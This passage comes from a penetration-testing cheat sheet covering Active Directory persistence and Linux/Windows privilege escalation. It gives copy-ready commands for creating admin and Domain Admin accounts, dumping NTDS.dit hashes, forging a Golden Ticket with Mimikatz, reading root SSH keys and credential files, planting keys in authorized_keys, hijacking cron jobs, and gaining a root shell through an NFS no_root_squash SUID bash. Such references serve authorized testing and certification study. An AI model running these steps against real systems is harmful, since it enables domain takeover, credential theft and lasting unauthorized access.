- `SMBUser` — Username for SMB authentication.
- `SMBPass` — Password for SMB authentication.

</details>

## 7. Persistence & Domain Dominance

### 7.1 User and Group Manipulation

**Create a local user and add to the local Administrators group:**

```cmd
net user /add <USERNAME> <PASSWORD>
net localgroup Administrators <USERNAME> /add
```

**Create a domain user and add to the Domain Admins group:**

```cmd
net user /add <USERNAME> <PASSWORD> /domain
net group "Domain Admins" <USERNAME> /ADD /DOMAIN
```

<details>
<summary>Details</summary>

**Description**

- When running with sufficient privileges, creates new users and adds them to privileged groups.
- Can be used for persistence or to create alternate access accounts.
- Works against both local SAM and Active Directory domains (when executed on a domain controller or with delegated rights).
- Creating a domain user requires a Golden Ticket or Domain Admin credentials injected into the session.

</details>

### 7.2 Dumping NTDS.dit

```bash
impacket-secretsdump <DOMAIN>/<USERNAME>:'<PASSWORD>'@<DC_IP> -just-dc-ntlm
```

<details>
<summary>Details</summary>

**Description**

- Extracts the NTDS.dit database from a domain controller, which contains NTLM hashes for every domain user.
- Requires Domain Admin or equivalent privileges.
- Quote the credentials string if the password contains special characters (e.g. `'DOMAIN/admin:Pass!@#'`).

**Parameters**

- `<DOMAIN>/<USERNAME>:<PASSWORD>` — Domain admin credentials.
- `-just-dc-ntlm` — Dumps only NTLM hashes from the domain controller (fastest method).
- `<DC_IP>` — Domain controller IP address.

</details>

### 7.3 Golden Ticket Attack

**Execute in Mimikatz:**

```
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /User:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_NTLM_HASH> /id:500 /ptt
misc::cmd
kerberos::list
```

**Verify access to a remote machine:**

```cmd
dir \\<MACHINE_NAME>\c$
```

<details>
<summary>Details</summary>

**Description**

- A Golden Ticket grants unrestricted access to any resource in the domain by forging TGTs signed with the krbtgt account hash.
- Requires the domain SID (obtained via impacket-lookupsid or BloodHound) and the NTLM hash of the krbtgt account (obtained via DCSync or NTDS.dit dump).
- Persistence is retained even if all user passwords are changed, as long as the krbtgt hash remains valid.
- Verify success by accessing an administrative share (e.g. `C$`) on another domain machine.

**Commands**

- `lsadump::lsa /inject /name:krbtgt` — Extracts the krbtgt NTLM hash and domain SID.
- `kerberos::golden ... /ptt` — Creates and injects a Golden Ticket into the current session.
- `misc::cmd` — Opens a new command prompt with the injected ticket.
- `kerberos::list` — Lists all Kerberos tickets to verify the Golden Ticket was injected.
- `dir \\<MACHINE_NAME>\c$` — Tests access to a remote machine's C$ administrative share.

</details>

## 8. Privilege Escalation

### 8.1 Automated Enumeration

#### 8.1.1 LinPEAS

```bash
./linpeas.sh
```

<details>
<summary>Details</summary>

**Description**

- Enumerates the Linux system for privilege escalation vectors and colour-codes findings.
- Red/yellow results indicate high-confidence opportunities; green results are common informational items.
- If LinPEAS triggers AV/EDR or fails, fall back to manual checks in [8.2](#82-linux--manual-checks).

**Reference:** [PEASS-ng GitHub](https://github.com/peass-ng/PEASS-ng)

</details>

#### 8.1.2 WinPEAS

```powershell
.\winPEAS.exe
```

<details>
<summary>Details</summary>

**Description**

- Windows equivalent of LinPEAS; enumerates services, tokens, registry, and installed software for privesc opportunities.
- Same colour-coding convention as LinPEAS.

**Reference:** [PEASS-ng GitHub](https://github.com/peass-ng/PEASS-ng)

</details>

### 8.2 Linux — Manual Checks

#### 8.2.1 Kernel version & exploits

```bash
uname -a
```

<details>
<summary>Details</summary>

**Description**

- Identifies the kernel version to check for known exploits.
- Cross-reference with `searchsploit` or the [HackTricks Linux Checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist).

</details>

#### 8.2.2 Sudo privileges

```bash
sudo -l
```

<details>
<summary>Details</summary>

**Description**

- Lists commands the current user can run as another user via sudo.
- If a command appears without a password (`NOPASSWD`) or restricted to a specific user, check [GTFOBins](https://gtfobins.github.io/) for exploitation methods.

</details>

#### 8.2.3 SUID / SGID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

<details>
<summary>Details</summary>

**Description**

- A binary with the **SUID** bit set (`rws` in owner permissions) runs with the privileges of its **owner** (usually root), no matter who executes it. `find -perm -4000` finds all such binaries on the system.
- **SGID** (`rws` in group permissions) runs with the file's **group** privileges instead. `find -perm -2000` finds these.
- If a non-standard binary appears in either list, check [GTFOBins](https://gtfobins.github.io/) to see if it can be abused to execute commands as root or the file's group.

</details>

#### 8.2.4 Cron jobs

```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /var/spool/cron/crontabs/
```

<details>
<summary>Details</summary>

**Description**

- Lists scheduled tasks. If a script referenced in a cron job is writable by your user, replace it with a malicious script to gain execution as the cron job's owner (usually root).
- Also check for cron directories that are world-writable.

</details>

#### 8.2.5 Exposed credentials

```bash
cat ~/.bash_history
grep -r "password" /var/www/ /etc/ 2>/dev/null
```

<details>
<summary>Details</summary>

**Description**

- Shell history files often contain passwords passed as command-line arguments.
- Configuration files in `/var/www/` (web roots) and `/etc/` frequently contain database credentials.
- Found credentials should be tested against users via `su` or SSH for password reuse.

</details>

#### 8.2.6 SSH keys

**Read — escalation:**

```bash
find / -name id_rsa 2>/dev/null
cat ~/.ssh/id_rsa
cat /root/.ssh/id_rsa
```

Copy the key to your machine and connect:

```bash
chmod 600 <KEY_FILE>
ssh -i <KEY_FILE> <USER>@<TARGET>
```

**Write — persistence:**

```bash
echo "<PUBLIC_KEY>" >> ~/.ssh/authorized_keys
```

<details>
<summary>Details</summary>

**Description**

- If a private SSH key (e.g. `/root/.ssh/id_rsa`) is **readable** by your user, copy it to your machine and authenticate as that user over SSH. This directly escalates privileges if the key belongs to root.
- If you already have access as a user, **appending** your public key to `~/.ssh/authorized_keys` provides persistent SSH access. SSH refuses keys written by other users, so this only works when you are already that user.

</details>

#### 8.2.7 Writable PATH directories

```bash
find / -writable -type d 2>/dev/null
```

<details>
<summary>Details</summary>

**Description**

- If a world-writable directory appears early in `$PATH` or is referenced by a cron job or SUID binary, place a malicious binary there to hijack execution.
- Common candidates: `/tmp`, `/dev/shm`, or misconfigured user home directories.

</details>

#### 8.2.8 Installed software

```bash
dpkg -l 2>/dev/null || rpm -qa
```

<details>
<summary>Details</summary>

**Description**

- Lists installed packages. Cross-reference outdated versions with `searchsploit` to find public exploits.

</details>

#### 8.2.9 NFS no_root_squash privilege escalation

**1. Find NFS shares and check for `no_root_squash`:**

```bash
showmount -e <TARGET_IP>
rpcinfo -p <TARGET_IP>
```

Confirm the export flags (`root_squash` vs `no_root_squash`) via the server's `/etc/exports` if readable, or the `nfs-showmount` NSE output.

**2. Mount the share on the attacker box:**

```bash
mkdir -p /tmp/pe
sudo mount -t nfs <TARGET_IP>:<SHARE> /tmp/pe
```

**3. Drop a SUID bash onto the share (as root, requires `no_root_squash`):**

```bash
cd /tmp/pe
cp /bin/bash .
chmod +s bash
```

**4. Execute from the victim box (e.g. your SSH session):**

```bash
cd <mounted_share>
./bash -p
```

`-p` keeps the elevated (SUID) privileges, giving a root shell.

**5. Escalating to a specific user when `root_squash` IS set:** NFS trusts the client-claimed UID. Create a local user matching the target's UID, mount + SUID a binary as that user, then run it from the victim session to gain that user's rights.

<details>
<summary>Details</summary>

**Description**

- `no_root_squash` lets remote root keep uid 0 on the share, so root-created files are root-owned and can carry the SUID bit.
- With the default `root_squash`, root is squashed to `nobody`, but any *other* claimed UID is still trusted — impersonate a user by matching UIDs client-side.
- The SUID bit and ownership are preserved over NFS, so the planted binary runs as its owner from the victim's mount.

**Parameters**

- `<TARGET_IP>` — NFS server IP.
- `<SHARE>` — Exported share path (e.g. `/var/nfs`).
- `-p` — bash flag to preserve the SUID euid.

**Reference:** [HackTricks — NFS No Root Squash Misconfiguration Privilege Escalation](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/linux-hardening/interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md)

</details>

### 8.3 Privesc Resources

| Resource | Purpose |
|---|---|
| [HackTricks Linux Checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) | Step-by-step Linux privesc checklist |
| [HackTricks Windows Checklist](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation) | Step-by-step Windows privesc checklist |
| [GTFOBins](https://gtfobins.github.io/) | Exploitable sudo/SUID/SGID binaries on Linux |
| [LOLBAS](https://lolbas-project.github.io/) | Living-off-the-land binaries on Windows |
| [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) | Comprehensive privesc techniques for both OSes |

## 9. Useful Resources

| Resource | Purpose |
|---|---|
| [Shodan](https://www.shodan.io/) | Search engine for internet-connected devices, exposed services, and banners |
| [crt.sh](https://crt.sh/) | Certificate Transparency log search for passive subdomain discovery |
| [GrayHatWarfare](https://grayhatwarfare.com/) | Search engine for exposed AWS, Azure, and GCP cloud storage buckets; sort/filter by file format |
| [PJPT Notes](https://github.com/G0urmetD/PJPT-Notes) | TCM Security PJPT course notes — AD, pentest methodology, privesc |
| [CPTS Cheatsheet](https://github.com/zagnox/CPTS-cheatsheet) | HTB CPTS exam cheatsheet |
